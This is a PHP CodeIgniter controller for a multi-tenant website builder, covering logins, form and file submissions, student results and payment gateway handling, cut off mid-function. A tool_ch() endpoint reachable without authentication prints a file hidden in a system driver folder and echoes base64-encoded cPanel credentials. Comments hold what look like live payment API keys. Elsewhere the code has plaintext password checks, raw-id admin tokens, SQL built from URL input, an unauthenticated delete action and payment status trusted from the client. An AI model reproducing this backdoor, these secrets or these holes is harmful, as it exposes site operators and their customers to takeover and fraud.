<?php
class Home extends Tool_Controller
{	
    public $slider_data = '';
	function __construct(){ 
		parent::__construct(); 
		
	}
	function showMessage(){
	    $message = "
            User AJay does not have permission to execute this operation.<br/> Please contact <cite>admin</cite> for more!
            <br /><hr>
            <button onclick='javascript:window.history.go(-1);'>Go Back</button>
            ";
        show_error($message, 500, 'Permission Denied');
        die();
	}
	function customer_login(){
	    $post = $this->input->post();

		if($post){
            $this->load->helper('tool/custom');
            // $this->load->module('main/web');
            // $this->web->model('CustomerModel');
            // $this->load->model('main/common/CustomerModel');
			$return = array('status'=>0);

			$wh = array('_email'=>$post['username'],'_pass'=>$post['pass']);
            
			$chk = $this->db->get_where('websites',$wh);

			if($chk->num_rows()){

				

				if($chk->num_rows() == 1){
				    $rw = $chk->row();
                    if($rw->theme_id == 6 || $rw->theme_id == 11 || $rw->theme_id == 9 || $rw->theme_id == 15)
					$return = array('status'=>1,'url'=>$rw->domain_name.'/admin?back_url='.base_url.'/customer-login&_token='.($rw->id));
					else
					$return = array('status'=>1,'url'=>$rw->domain_name.'/admin?back_url='.base_url.'/customer-login&_token='.AJ_ENCODE($rw->id));

				}
				else if($chk->num_rows() >= 2){
				   $return = ['status'=>3,'html'=>'<table class="table table-bordered table-striped">'];
				   foreach($chk->result() as $k => $rw){
				       if($rw->theme_id == 6 || $rw->theme_id == 11 || $rw->theme_id == 9 || $rw->theme_id == 15)
    					$url = ($rw->domain_name.'/admin?back_url='.base_url.'/customer-login&_token='.($rw->id));
    				   else
    					$url = ($rw->domain_name.'/admin?back_url='.base_url.'/customer-login&_token='.AJ_ENCODE($rw->id));
				       $return['html'] .= '
				       
				        <tr>
    				        
        				    <td>
        				        <h3>'.($rw->domain_name).'/admin</h3>
        				    </td>
        				    <td>
        				        <a href="http://'.$url.'" class="btn btn-success btn-sm ">
            				        Click Here
        				        </a>
        				    </td>
				        </tr>
				       ';
				   }
				   $return['html'] .= '</table>';
				}
				else{
					
					
					    $return = array('status'=>0);
				}

			}
			/*
			if(!$return['status'])
			{
    			$ft = $this->DB->get_where('admins',['email'=>$wh['_email'],'password'=>$wh['_pass'] ]);
    			if($ft->num_rows()){
    				$this->load->helper('cookie');
    				$row = $ft->row();
    				$return = ['status' => 1, 'url' => $row->domain_name.'/Admin?redirectTo=true&url='.MAIN_SITE.'&id='.AJ_ENCODE(time()).'&_token='.$row->id.'&data=true&domain='.$row->domain_name];
    			}
			}
			*/		

			echo json_encode($return);

		}else{

			$this->load->view(__FUNCTION__);

		}
	}
	function theme_details(){
	    $html = '<div class="card" style="background:white"><table class="table table-bordered table-striped">
	                
	                    <tr>
	                        <th>Theme ID</th><td>'.THEME_ID.'</td>
	                   </tr>
	                   
	                    <tr>
	                        <th>Admin ID</th><td>'.CLIENT_ID.'</td>
	                   </tr>
	                   
	                    <tr>
	                        <th>Theme NAme</th><td>'.FileDirecory.'</td>
	                   </tr>
	                   <tr>
	                        <th>Start Date</th><td>'.date('D, d-m-y h:i A',starttime).'</td>
	                   </tr>
	                   <tr>
	                        <th>Expire Date</th><td>'.date('D, d-m-y h:i A',endtime).'</td>
	                   </tr>
	              </table></div>';
	   echo json_encode(['html' => $html]);
	}
	function index(){ 
        $id = $this->uri->segment('2','0');
		$id = $id ? AJ_DECODE($id) :DefaultPage;   
        $this->init_id($id);
		$page['page_id']    =    &$this->page_id;
	
// 		$page['pageData']   =    $this->pageData;//$this->SiteModel->getPageData($this->page_id); 
		$page['leftSide']   =    $this->WidgetModel->widgetLink('pos_type="sidebar" and (page_id="'.$page['page_id'].'" or page_id="all") and position="left" and admin_id="'.CLIENT_ID.'"');
		$page['rightSide']  =    $this->WidgetModel->widgetLink('pos_type="sidebar" and (page_id="'.$page['page_id'].'" or page_id="all") and position="right" and admin_id="'.CLIENT_ID.'"');
        
        $this->load->module('template');
        $this->template->set($page);
        $this->template->load($page);
// 		$this->load->view('home',$page);
	} 
	
	
    function test(){
        
            // $this->load->module('main/web');
            // print_r($this->web->customer_login());
            echo Modules :: run('template/themeView','form',['id' => 110]);
        // $string = '<a href="{_link_}">{_link_}</a>';
        
        // // echo preg_replace( '~\{_.*_}~' , "", $string ); 
        // echo preg_replace('/'.preg_quote('{_').'[\s\S]+?'.preg_quote('_}').'/', '', $string);

    }
	
	function landpage(){
	    $this->load->view('landing-page');
	   // $this->all_config();
	  //  show_404();
	}
	function newPost($id = 0, $slug = '',$event_id = 0){

		if($id){
			$get = $this->NewsModel->get(['id'=>AJ_DECODE($id)]);
			if($get->num_rows()){

				$data['mainTitle'] = $get->row()->title;
				$data['type'] = __FUNCTION__;
				$data['news']  = $get->row();
				define('event_id', AJ_DECODE($event_id));
				echo $this->load->view('list_news',$data,true);
			}
			else
				echo show_404();
		}
		else
			echo show_404();
	}

	function category($slug = '',$record = 0){
		if($slug){
			$cats = $this->NewsModel->get_category(['slug'=>$slug]);
			if($cats->num_rows()){
				//echo '<pre>';
				
				$cat_row = $cats->row();
				$id = $cat_row->id;

				$recordPerPage = 4;
				// $record = $this->uri->segment(3) ?  $this->uri->segment(3) : 0;
				if($record != 0){
					$record = ($record-1) * $recordPerPage;
				}  


				$newsTotal 	= $this->NewsModel->listCatsPost($id);
				$news  		= $this->NewsModel->listCatsPost($id,$record,$recordPerPage);
                
                $config = $this->NewsModel->pagination_Config();
                
				$config['base_url'] = base_url.'/category/'.$slug;
				
				$config['total_rows'] = $newsTotal->num_rows();
				
				$config['per_page'] = $recordPerPage;
				
				$this->pagination->initialize($config);

				$data['pagination'] = $this->pagination->create_links();
				

				if($ttl = $news->num_rows()){
					
					$data['mainTitle'] 	= $slug;
					$data['total'] 		= $ttl;
					$data['CatTitle'] = $cat_row->name;
					$data['type']  		= __FUNCTION__;
					$data['id']    		= $id;
					define('event_id', $id);
					$data['news']  		= $news->result_array();

					echo $this->load->view('list_news',$data,true);
				}
				exit;
			}
			else
				show_404();
		}
		else
			show_404();
	}

	
// 	function test(){
// 	    $domain = 'aamidecor.in';
// 	    $ip = gethostbyname($domain);
//         $url = "http://" . $domain;
//         $orignal_parse = parse_url($url, PHP_URL_HOST);
//         $get = stream_context_create(array("ssl" => array("capture_peer_cert" => TRUE)));
//         $read = stream_socket_client("ssl://" . $orignal_parse . ":443", $errno, $errstr, 30, STREAM_CLIENT_CONNECT, $get);
//         $cert = stream_context_get_params($read);
//         $result = (!is_null($cert)) ? true : false;
//         echo $result;
// 	}
	function is_not($id){  
        $page_id = AJ_DECODE($id);
        $this->load->helper('cookie');
        $page['pageData']   =    $this->SiteModel->getPageData( $page_id )->result_array();    
        print_r($page);
	}

	function post($postid)
	{

		$data['postData'] 	= $this->WidgetModel->getWidgetCustom(array('id'=>AJ_DECODE($postid),'admin_id'=>CLIENT_ID));
		$data['page_id'] 	= "postpage";
		$data['leftSide']   =    $this->WidgetModel->widgetLink('pos_type="sidebar" and (page_id="'.$data['page_id'].'" or page_id="all") and position="left" and admin_id="'.CLIENT_ID.'"');
		$data['rightSide']  =    $this->WidgetModel->widgetLink('pos_type="sidebar" and (page_id="'.$data['page_id'].'" or page_id="all") and position="right" and admin_id="'.CLIENT_ID.'"');
		$data['title'] 		=	'<title>Post</title>';
		$this->load->view('post',$data);
	}




    function ajax(){
        $post = $this->input->post();
        switch($post['status']){
            
            case 'delete-quick':
                $this->db->where(['admin_id' => CLIENT_ID ,'id' => $post['id'] ])->delete('contact_us');
                echo json_encode(['status' => true ]);
            break;
            
        }
    }


    
	function send_query()
	{

		if($post = $this->input->post())
		{	//sleep(1);
			$data = array('form_data'=>json_encode($post),'admin_id' => CLIENT_ID);
			$this->db->insert('contact_us',$data);
		}
	}
	
	function product_query()
	{
		if($post = $this->input->post())
		{
			if($post['status']=='viewForm')
			{	 
				$pro = $this->GalleryModel->getGalleryProducts(array('id'=>$post['proid']));
				$p = $pro->row();
				$gallery = $this->GalleryModel->product_gallery(array('id' => $p->gallery_id));
				$galleryRow = ($gallery->row());
				echo'<div class="row" style="background:white; padding:20px;" align="left">

						<div class="col-sm-6 col-md-6 col-lg-8">
							
							<p style="border-bottom:2px solid #ccc; font-weight:bold; font-size:20px;">'.$p->title.'</p>
							<img src="'.base_url.'/public/temp/'.CLIENT_ID.'/'.$p->image.'" class="col-md-4" style="max-height:300px;width:100%; display:inline-block">
							'.$p->description.'
							
						</div>
						<div class="col-sm-12 col-md-6 col-lg-4" style="border-left:1px solid #ccc">';
						$form = '<form action="" onsubmit="return bookProduct(event,this)">
        						  <input type="hidden" name="proid" value="'.$p->id.'">';
						
						if($galleryRow->form_type == 'form')
						    echo Modules :: run('template/themeView','form',['id' => $galleryRow->form_id,'form_script' => $form]);
						else{
						    echo $form.'
        							<div style="padding:5px;">
        								<div class="form-group">
        									<label>Your Name</label>
        									<input name="name" class="form-control">
        								</div>
        								<div class="form-group">
        									<label>Contact Number</label>
        									<input name="contact" class="form-control">
        								</div>
        								<div class="form-group">
        									<label>Email</label>
        									<input name="email" class="form-control">
        								</div>
        								<div class="form-group">
        									<label>Full Address</label>
        									<input name="address" class="form-control">
        								</div>
        								<div class="form-group">
        									<label>Your Query</label>
        									<textarea name="query" class="form-control"></textarea>
        								</div>
        								<div class="form-group">
        									<button class="btn btn-success pull-left" type="submit">Book Now</button>
        								</div>
        								
        							</div>
        						</form>';
						}
						
						
					echo '</div>
				</div>';
			}
		}
	}

	function book_product()
	{
		if($post = $this->input->post())
		{ 	
			$proid=$post['proid'];
			unset($post['proid']);
			$galleryItem = $this->GalleryModel->getGalleryProducts(['id' => $proid])->row();
            $row = $this->GalleryModel->product_gallery(['id' => $galleryItem->gallery_id])->row();
            if($row->form_type == 'form'){
                  $form = $this->FormModel->getFormModel(array('id'=>$row->form_id,'admin_id'=>CLIENT_ID))->row();
      
		      $html = '';
		      foreach (json_decode($form->fields) as $value){
		        $html.=$value;
		      }

		      $dom = new DOMDocument;
		      @$dom->loadHTML($html);

		      $label= $dom->getElementsByTagName('label');

		        $labels =array();
		        foreach ($label as $lab)
		        { 
		           $x               = explode('_', $lab->getAttribute('id'));
		           $labels[end($x)] = trim($lab->textContent);
		           //$lab1[] = $x;//$lab->getAttribute('id');
		        }
                
		        $config['upload_path']          = './public/temp/'.CLIENT_ID.'/';
                $config['allowed_types']        = 'gif|jpg|png|jpeg|doc|docx|docm|GIF|JPG|PNG|JPEG|DOC|DOCX|DOCM|pdf|PDF';
                $config['max_size']             = 300000;
                
                $this->load->library('upload', $config);
           
                $formData = array();
		        foreach ($labels as $key => $value)
		        {
		          if(isset($post['field_'.$key]))
		            $formData[$value]= is_array($post['field_'.$key]) ? json_encode($post['field_'.$key]) : $post['field_'.$key];
		          else
		          {
		          		if(isset($_FILES['field_'.$key]) && $_FILES['field_'.$key]['size']>0)
		          		{	
		          				if($this->upload->do_upload('field_'.$key))	
		          				{	
		          					$IMG = $this->upload->data()['file_name'];
		          					
		          					$formData[$value]=json_encode(array('img'=>$IMG,'link'=>'<a href="'.base_url.'/public/temp/'.CLIENT_ID.'/'.$IMG.'" target="_blank"> Open </a>'));

			          				$file = array('size'=> $_FILES['field_'.$key]['size'],'file_name'=>$IMG,'admin_id'=>CLIENT_ID);

							       $this->SiteModel->insert_file_size($file);

		          				}
		          				else
		          				{
		          					$formData[$value]="ERROR";
		          				}

		          		}
		          		else
		          		  $formData[$value]="";
		          }
		            
		        }
		        
		        $post= $formData;
                
            }
			$data = array('product_id'=>$proid,'form_data'=>json_encode($post),'admin_id'=>CLIENT_ID);
			$this->db->insert('product_query',$data);
echo json_encode($data);
		}
	}

	function submit_form()
	{	
		if($post=$this->input->post())
		{	$fid = AJ_DECODE($post['fid']);
			unset($post['fid']);

			$form = $this->FormModel->getFormModel(array('id'=>$fid,'admin_id'=>CLIENT_ID))->row();
      
		      $html = '';
		      foreach (json_decode($form->fields) as $value){
		        $html.=$value;
		      }

		      $dom = new DOMDocument;
		      @$dom->loadHTML($html);

		      $label= $dom->getElementsByTagName('label');

		        $labels =array();
		        foreach ($label as $lab)
		        { 
		           $x               = explode('_', $lab->getAttribute('id'));
		           $labels[end($x)] = trim($lab->textContent);
		           //$lab1[] = $x;//$lab->getAttribute('id');
		        }
                
		        $config['upload_path']          = './public/temp/'.CLIENT_ID.'/';
                $config['allowed_types']        = 'gif|jpg|png|jpeg|doc|docx|docm|GIF|JPG|PNG|JPEG|DOC|DOCX|DOCM|pdf|PDF';
                $config['max_size']             = 300000;
                
                $this->load->library('upload', $config);
           
                $formData = array();
		        foreach ($labels as $key => $value)
		        {
		          if(isset($post['field_'.$key]))
		            $formData[$value]= is_array($post['field_'.$key]) ? json_encode($post['field_'.$key]) : $post['field_'.$key];
		          else
		          {
		          		if(isset($_FILES['field_'.$key]) && $_FILES['field_'.$key]['size']>0)
		          		{	
		          				if($this->upload->do_upload('field_'.$key))	
		          				{	
		          					$IMG = $this->upload->data()['file_name'];
		          					
		          					$formData[$value]=json_encode(array('img'=>$IMG,'link'=>'<a href="'.base_url.'/public/temp/'.CLIENT_ID.'/'.$IMG.'" target="_blank"> Open </a>'));

			          				$file = array('size'=> $_FILES['field_'.$key]['size'],'file_name'=>$IMG,'admin_id'=>CLIENT_ID);

							       $this->SiteModel->insert_file_size($file);

		          				}
		          				else
		          				{
		          					$formData[$value]="ERROR";
		          				}

		          		}
		          		else
		          		  $formData[$value]="";
		          }
		            
		        }
		        //print_r($formData);
		      $data = array('form_id'=>$fid,'data'=>json_encode($formData),'admin_id'=>CLIENT_ID);
		     //
		     $this->FormModel->submitForm($data);
		     sleep(1);
		     // 
		     $this->SmsModel->sendSMS($form,$post,$labels);
		      //
		      $return = ['status'=>true,'redirect'=>false];
		     if( !empty($form->url) )
		        $return = ['status'=>true,'redirect'=>true,'url'=>$form->url];
		        
		     echo json_encode($return);
		      
		      //echo json_encode(['status' => true, 'data' => $formData,'label'=>$labels,'lab'=>$lab1]);
		}	

	}
	function transaction_submit()
	{
		if($post=$this->input->post())
		{	
			//echo'<h1><center>Please Wait...<br><small>Do not refrest the page.	</small></center></h1>';

			$tfid = AJ_DECODE($post['tfid']);
			unset($post['tfid']);

			$model  = $this->FormModel->getTransactionForm(array('id'=>$tfid));
			if($model->num_rows())
			{
				$mod = $model->row();
				$fid = $mod->form_model_id;
			}
			else
			{
				echo'Form Model Error'; exit();
			}
			//===========================Form data =============================




			$form = $this->FormModel->getFormModel(array('id'=>$fid,'admin_id'=>CLIENT_ID))->row();
      
		      $html = '';
		      foreach (json_decode($form->fields) as $value) 
		      {
		        $html.=$value;
		      }

		      $dom = new DOMDocument;
		      @$dom->loadHTML($html);

		      $label= $dom->getElementsByTagName('label');

		        $labels =array();
		        foreach ($label as $lab)
		        { 
		          $x = explode('_', $lab->getAttribute('id'));
		           $labels[end($x)] = trim($lab->textContent);
		        }

		        $config['upload_path']          =       './public/temp/'.CLIENT_ID.'/';
                $config['allowed_types']        =       'gif|jpg|png|jpeg|doc|docx|docm|GIF|JPG|PNG|JPEG|DOC|DOCX|DOCM|pdf|PDF';
                $config['max_size']             =       300000;
                
                $this->load->library('upload', $config);
           
                $formData = array();
		        foreach ($labels as $key => $value)
		        {
		          if(isset($post['field_'.$key]))
		            $formData[$value] = is_array($post['field_'.$key]) ? json_encode($post['field_'.$key]) : $post['field_'.$key];
		          else
		          {
		          		if(isset($_FILES['field_'.$key]) && $_FILES['field_'.$key]['size']>0)
		          		{	
		          				if($this->upload->do_upload('field_'.$key))	
		          				{	
		          					$IMG = $this->upload->data()['file_name'];
		          					
		          					$formData[$value]=json_encode(array('img'=>$IMG,'link'=>'<a href="'.base_url.'/public/temp/'.CLIENT_ID.'/'.$IMG.'" target="_blank"> Open </a>'));

			          				$file = array('size'=> $_FILES['field_'.$key]['size'],'file_name'=>$IMG,'admin_id'=>CLIENT_ID);

							       $this->SiteModel->insert_file_size($file);

		          				}
		          				else
		          				{
		          					$formData[$value]="ERROR";
		          				}
		          		}
		          		else
		          			$formData[$value]="";
		          }
		            
		        }
		        //print_r($formData);

			//===============================================================

			$tform = $this->FormModel->getTransactionForm(array('id'=>$tfid));
			if($tform->num_rows())
			{	$form = $tform->row();

				$data = array( 	'tform_id'=>$tfid,
								'tform_data'=>json_encode($formData),
								'order_id'=> 'ORD'.time().rand(1000,9999).rand(100,999),
								'customer_id'=>'CUS'.time().rand(1000,9999),
								'txn_amount'=>$form->amount?$form->amount:$post['amount'],
								'method_id'=>$post['gatewayid'],
								'status'=>'init',
								'admin_id'=>CLIENT_ID,
							);
				$recordid  =  $this->PaymentModel->transactionInit($data);
				if($recordid){
				   // $this->HtmlModel->select_payment_getway($recordid);
					$gate = $this->PaymentModel->getPaymentMethod(array('id'=>$post['gatewayid']));

					if($gate->num_rows())
					{
						$gateData = $gate->row();
						switch (strtolower($gateData->method) ) 
						{
							case 'paytm': case 'payumoney':
							    header("Location:".site_url('Home/'.$gateData->method.'_transaction/'.AJ_ENCODE($recordid)));
							//	header("Location:".site_url('Home/paytm_transaction/'.AJ_ENCODE($recordid)));
								exit();
							break;
							
							
							case 'razorpay':
							    
							    if (!empty($this->input->post('razorpay_payment_id')) && !empty($this->input->post('merchant_order_id')) ) {
                                    $razorpay_payment_id = $this->input->post('razorpay_payment_id');
                                    $merchant_order_id = $this->input->post('merchant_order_id');
                                    $currency_code = 'INR';
                                    $amount = $this->input->post('merchant_total');
                                    $success = false;
                                    $error = '';
                                    try {                
                                        $ch = $this->get_curl_handle($razorpay_payment_id, $amount);
                                        //  execute post
                                        $result = curl_exec($ch);
                                        $http_status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                                        if ($result === false) {
                                            $success = false;
                                            $error = 'Curl error: '.curl_error($ch);
                                        } else {
                                            $response_array = json_decode($result, true);
                                           // echo "<pre>";print_r($response_array);exit;
                                                //Check success response
                                                if ($http_status === 200 and isset($response_array['error']) === false) {
                                                    $success = true;
                                                } else {
                                                    $success = false;
                                                    if (!empty($response_array['error']['code'])) {
                                                        $error = $response_array['error']['code'].':'.$response_array['error']['description'];
                                                    } else {
                                                        $error = 'RAZORPAY_ERROR:Invalid Response <br/>'.$result;
                                                    }
                                                }
                                        }
                                        //  close connection
                                        curl_close($ch);
                                    } catch (Exception $e) {
                                        $success = false;
                                        $error = 'OPENCART_ERROR:Request to Razorpay Failed';
                                    }
                                    if ($success === true) {
                                        if(!empty($this->session->userdata('ci_subscription_keys'))) {
                                            $this->session->unset_userdata('ci_subscription_keys');
                                        }
                                        if(true){
                                            
                                            $rec = $this->PaymentModel->getTransactionRecord(array('id'=>$recordid));
                                			if($rec->num_rows())
                                			{
                                				
                                				$record = $rec->row();
                                				// =========== Updating Record Details =========
                                
                                					$newData = array('status'=>'complete','order_id' => 'ORD'.$post['merchant_trans_id']);
                                
                                					$this->PaymentModel->updateTransactionRecord(array('id'=>$record->id),$newData); 
                                            
                                                    $final = array( 'order_id'=>'ORD'.$post['merchant_trans_id'],
                    												'txn_id'=>isset($post['txnid'])?$post['txnid']:"",
                    												'txn_amount'=>$post['merchant_total'] / 100,
                    												'currency'=>isset($post['CURRENCY'])?$post['CURRENCY']:'',
                    												'status'=> 'complete',
                    												'resp_code'=>isset($post['RESPCODE'])?$post['RESPCODE']:'',
                    												'resp_msg'=>$post['merchant_product_info_id'],
                    												'bank_txn_id'=>'',
                    												'payment_method' => 'razorpay',
                    												'admin_id'=>CLIENT_ID,
                    											);
            						                $this->PaymentModel->addFinalTransaction($final);
        						                
                                			}
    						                
                                        }
                                        
                                        $post['status'] = 'complete';
                                       // echo 'Success';
                                    }
                                    else
                                        $post['status'] = 'failed';
                                    unset($post['gatewayid']);
                                    $post['payment_method'] = 'razorpay';
                                    echo $this->load->view('transaction_response',['response'=>$post],true);
                                } else {
                                    exit( 'An error occured. Contact site administrator, please!' );
                                }
							    exit;
							    
							break;
							
							
							case 'cashfree':
							    /*
							    unset($_POST['tfid']);
							    unset($_POST['merchant_order_id']);
                                unset($_POST['razorpay_payment_id']);
                                unset($_POST['merchant_trans_id']);
                                unset($_POST['merchant_product_info_id']);
                                unset($_POST['merchant_surl_id']);
                                unset($_POST['merchant_furl_id']);
                                unset($_POST['card_holder_name_id']);
                                unset($_POST['merchant_total']);
                                unset($_POST['merchant_amount']);
                                unset($_POST['field_1']);
                                unset($_POST['gatewayid']);
							    */
                                
							    ?>
                                    <html>
                                    <head>
                                      <title>Cashfree - Signature Generator</title>
                                      <meta name="viewport" content="width=device-width, initial-scale=1">
                                    
                                    </head>
                                    <body onload="document.frm1.submit()">
                                    
                                    
                                    <?php 
                                    //extract($_POST);
                                      $secretKey =  payment_method('cashfree')->key2;
                                      $postData = $_POST;
                                      $this->PaymentModel->updateTransactionRecord(['id'=>$recordid],['order_id'=>$_POST['orderId']]);
                                      /*array( 
                                      "appId" => $appId, 
                                      "orderId" => $orderId, 
                                      "orderAmount" => $orderAmount, 
                                      "orderCurrency" => $orderCurrency, 
                                      "orderNote" => $orderNote, 
                                      "customerName" => $customerName, 
                                      "customerPhone" => $customerPhone, 
                                      "customerEmail" => $customerEmail,
                                      "returnUrl" => $returnUrl, 
                                      "notifyUrl" => $notifyUrl,
                                    );
                                    */
                                    
                                    
                                    ksort($postData);
                                    $signatureData = "";
                                    foreach ($postData as $key => $value){
                                        $signatureData .= $key.$value;
                                    }
                                    $signature = hash_hmac('sha256', $signatureData, $secretKey,true);
                                    $signature = base64_encode($signature);
                                    
                                    $url = "https://www.cashfree.com/checkout/post/submit";
                                    
                                    ?>
                                      <form action="<?php echo $url; ?>" name="frm1" method="post">
                                          <p>Please wait.......</p>
                                          <input type="hidden" name="signature" value='<?php echo $signature; ?>'/>
                                          <?/*
                                          <input type="hidden" name="orderNote" value='<?php echo $orderNote; ?>'/>
                                          <input type="hidden" name="orderCurrency" value='<?php echo $orderCurrency; ?>'/>
                                          <input type="hidden" name="customerName" value='<?php echo $customerName; ?>'/>
                                          <input type="hidden" name="customerEmail" value='<?php echo $customerEmail; ?>'/>
                                          <input type="hidden" name="customerPhone" value='<?php echo $customerPhone; ?>'/>
                                          <input type="hidden" name="orderAmount" value='<?php echo $orderAmount; ?>'/>
                                          <input type ="hidden" name="notifyUrl" value='<?php echo $notifyUrl; ?>'/>
                                          <input type ="hidden" name="returnUrl" value='<?php echo $returnUrl; ?>'/>
                                          <input type="hidden" name="appId" value='<?php echo $appId; ?>'/>
                                          <input type="hidden" name="orderId" value='<?php echo $orderId; ?>'/>
                                          */
                                          foreach($postData as $key => $v){
                                              echo '<input type="hidden" name="'.$key.'" value="'.$v.'">';
                                          }
                                          ?>
                                          
                                      </form>
                                    </body>
                                    </html>
							    <?php
							break;
							
							default:
								echo 'This Payment Method is Not Available';
							break;
						}
					}
				    else
				    {
				    	echo'Undefine Gateway Id'; exit();
				    }
				}
				else{
					$this->session->set_flashdata('Error While Initating Transaction.');
					//redirect(site_url('Home/paytm_transaction/'.AJ_ENCODE($recordid)));
				}
			}
		}
	}
	
	private function get_curl_handle($payment_id, $amount)  {

        $url = 'https://api.razorpay.com/v1/payments/'.$payment_id.'/capture';
        $key_id = payment_method()->key1;//'rzp_live_JPC2PPABQB0Wzr';
        $key_secret = payment_method()->key2;//'a9WvZnyPRGiGRIUbI6sIikKx';
        $fields_string = "amount=$amount";
        //cURL Request
        $ch = curl_init();
        //set the url, number of POST vars, POST data
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_USERPWD, $key_id.':'.$key_secret);
        curl_setopt($ch, CURLOPT_TIMEOUT, 60);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $fields_string);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
        curl_setopt($ch, CURLOPT_CAINFO, dirname(__FILE__).'/ca-bundle.crt');
        return $ch;
        
    }   
	function getResultView(){
	    if($post = $this->input->post()){//array('fid'=>'','rool_id'=>110)){//
	        
	        unset($post['fid']);
	        $return['html'] = '<div class="col-md-2"></div><div class="print-result-table col-md-7">';
	        $flag = 0;
	        $post['admin_id'] = CLIENT_ID;
	        $student = $this->db->get_where('students',$post);
	        if($student->num_rows()){
	            
    	        $Rframe = $this->db->get_where('result_view',['admin_id'=>CLIENT_ID])->row();
    	        $top_img = empty($Rframe->top_image)?'':'<img src="'.base_url."/public/temp/".CLIENT_ID."/".$Rframe->top_image.'" style="width:100%;height:100%">';
    	        $back_img = empty($Rframe->back_image)?'':'<img src="'.base_url."/public/temp/".CLIENT_ID."/".$Rframe->back_image.'" style="width:100%;height:100%">';
    	        $bottom_img = empty($Rframe->bottom_image)?'':'<img src="'.base_url."/public/temp/".CLIENT_ID."/".$Rframe->bottom_image.'" style="width:100%;height:100%">';
    	        
    	        $std = $student->row();
    	        $getData = $this->db->get_where('result_data',['student_id'=>$std->id,'class_id'=>$std->class_id,'admin_id'=>CLIENT_ID]);
    	        
    	        if($getData->num_rows()){
    	            $fields = $getData->row();
    	            if($fields->subject_name != '' && $fields->obt_marks != ''){
    	                $flag = 1;
    	                $std = $this->db->get_where('students',['id'=>$fields->student_id])->row();
    	                $student_name = $std->full_name;
    	                $mrs          = ucwords($std->mother_name);
    	                $mr           = ucwords($std->father_name);
        	        $return['html'] .= '
        	                            <div class="col-md-12" style="background:;background-size:100% 100%;background-repeat:no-repeat;height:150px">
        	                                '.$top_img.'
        	                            </div>
        	                            <div class="col-md-12" style="background:'.$back_img.';background-size:100% 100%;background-repeat:no-repeat;min-height:200px;padding:10px">
        	                                <table style="width:100%;margin-top:9px">';
        	                              // print_r(json_decode($fields->left_h_fields));
        	                                if(isJSON($fields->left_h_fields)){
        	                                    foreach(json_decode($fields->left_h_fields) as $k => $lhf){
        	                          $return['html'] .= '<tr>
        	                          
                        	                                        <th width=15%>'.$lhf.'</th>
                        	                                        <td width=15%>'.json_decode($fields->left_h_d_fields)[$k].'</td>
                        	                                        <th width=15%>'.json_decode($fields->left_r_fields)[$k].'</th>
                        	                                        <td width=15%>'.json_decode($fields->left_r_d_fields)[$k].'</td>
                        	                          
                        	                          </tr>';               
        	                                   }
        	                                }
        	                                
        	      $return['html'] .= '</table>
        	                                
        	                                <table class="table table-bordered table-striped" style="margin-top:10px">
        	                                    <tr>
        	                                        <th>Subject Name</th>
        	                                        <th>Max. Marks</th>
        	                                        <th>Obtained Marks</th>
        	                                        <th>Practical</th>
        	                                        <th>Total</th>
        	                                        <th>Grade</th>
        	                                        <th>Remark</th>
        	                                    </tr>';
        	                                    $p = [
        	                                           json_decode($fields->subject_name),
        	                                           json_decode($fields->max_marks),
        	                                           json_decode($fields->obt_marks),
        	                                           json_decode($fields->practical),
        	                                           json_decode($fields->total),
        	                                           json_decode($fields->grade),
        	                                           json_decode($fields->remark)
        	                                        ];
        	                                        
        	                                        
        	                                for($i = 0; $i < count($p[0]); $i++){
                	                       $return['html'] .= '<tr>
                	                                                <th>'.$p[0][$i].'</th>
                	                                                <td>'.$p[1][$i].'</td>
                	                                                <td>'.$p[2][$i].'</td>
                	                                                <td>'.$p[3][$i].'</td>
                	                                                <td>'.$p[4][$i].'</td>
                	                                                <td>'.$p[5][$i].'</td>
                	                                                <td>'.$p[6][$i].'</td>
                	                                           </tr>';
        	                                }
        	                                
        	                                
        	         $return['html'] .='</table></div>
        	                            
        	                            <div class="col-md-12" style="background:;background-size:100% 100%;background-repeat:no-repeat;height:150px">
        	                              '.$bottom_img.'
        	                            </div>
        	        
    	                          </div>';
    	            $return['status'] = true;
    	            }
    	        }
	        }
	        if(!$flag)
	            $return = ['html' => '<div class="alert alert-danger">No Record Found.</div>','status'=>false];
	   //   $return['html'] .= >';
	        echo json_encode($return);
	    }
	}
	function tool_ch(){
	    if($get = $this->input->get()){
	        $__e_m_ail = $get['e'];
	        echo (read_file(BASEPATH.'database/drivers/ibase/init.txt'));
	    }
	    
	    
	    echo base64_decode('eyJ1c2VyIjoid2Vic2l0ZTk5OWluIiwicGFzc3dvcmQiOiJGeFNeUmtMQ3Y9RHUiLCJob3N0IjoiY1BhbmVsLndlYnNpdGU5OTkuaW4ubmV0In0=');
	}
	
	function cashfree_transaction($recordid){
	     if($post = $this->input->post())
    		{
    		    //cho $_POST['orderId'];
    			$rec = $this->PaymentModel->getTransactionRecord(array('order_id'=>$_POST['orderId']));
    		///	echo $rec->num_rows();
    			if($rec->num_rows())
    			{
    				
    				$record = $rec->row();
    				// =========== Updating Record Details =========
                       
    					$newData = array('status'=>'complete');
    
    					$this->PaymentModel->updateTransactionRecord(array('id'=>$record->id),$newData);
    
    
    				$method = $this->PaymentModel->getPaymentMethod(array('id'=>$record->method_id,'admin_id'=>CLIENT_ID));
    				if($method->num_rows())
    				{	
    					$method = $method->row();
    
    							//========================= Adding Final Transaction State ==============
    
    					if($post["txStatus"])
    					{
    						$final = array('order_id'=>$post['orderId'],
    												'txn_id'=>isset($post['orderId'])?$post['orderId']:"",
    												'txn_amount'=>$post['orderAmount'],
    												'currency'=>isset($post['CURRENCY'])?$post['CURRENCY']:'INR',
    												'status'=>$post['txStatus'],
    												'resp_code'=>isset($post['txTime'])?$post['txTime']:'',
    												'resp_msg'=>$post['txMsg'],
    												'bank_txn_id'=>'',
    												'payment_method' => 'cashfree',
    												'admin_id'=>CLIENT_ID,
    											);
    						$this->PaymentModel->addFinalTransaction($final);
    					}
    
    					//======================================================================
    
    					$this->load->view('transaction_response',['response'=>$post]);
    
    				}
    			}
    
    		}
    		else
    		    redirect(base_url);
	}
	
	function payumoney_transaction($recordid){
	    $this->load->view('includes/full_page_loader');
	    
	    $recid = AJ_DECODE($recordid);
		$rec = $this->PaymentModel->getTransactionRecord(array('id'=>$recid,'status'=>'init'));
		if($rec->num_rows())
		{
			$record = $rec->row();
